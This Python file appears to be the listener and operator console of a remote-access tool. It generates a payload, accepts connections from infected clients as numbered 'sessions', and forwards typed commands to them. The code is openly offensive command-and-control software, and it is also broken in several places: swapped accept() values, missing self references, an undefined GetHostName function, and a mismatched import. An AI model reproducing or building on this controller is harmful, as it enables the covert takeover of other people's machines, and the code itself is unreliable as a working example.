import socket
import time
import _thread
import os
import subprocess
import Lib.Generator


class Server:

    def __init__(self,port,payload):
        self.sock = socket.socket()
        self.payload = payload
        self.addr = GetHostName(payload)
        self.port = port
        self.clients = {}
        self.generated = Generator.Generator(self.payload,self.port,self.addr)


    def run(self):
        self.sock.bind((self.addr,self.port))
        self.sock.listen(5)
        counter = 1
        _thread.start_new_thread(handler,())        
        while 1:            
            addr,conn = sock.accept()
            c = client(addr,conn)
            self.clients[counter] = c   
            print("recived new session at channel: " + counter)
            counter += 1
            time.sleep(0.5)

    def handler(self):
        self.currentChannel = 0
        while 1:             
                inp = input(self.payload + ">")
                if inp.startswith("set"):
                    self.currentChannel = int(inp.split(" ")[1])
                    comunicate()
                if inp == "exit":
                    break
    
    def comunicate(self):
        while 1:    
            data = self.clients[self.currentChannel].conn.recv(1024)
            print(repr(data))
            cmd = input(self.payload + "/sessions>")
            if cmd.startswith("change"):
                self.currentChannel = int(cmd.split(" ")[1])
                continue
            if cmd == "exit":
                break
            self.clients[self.currentChannel].conn.send(cmd.encode())

class client:

    def __init__(self,addr,conn):
        self.addr = addr
        self.conn = conn


            
    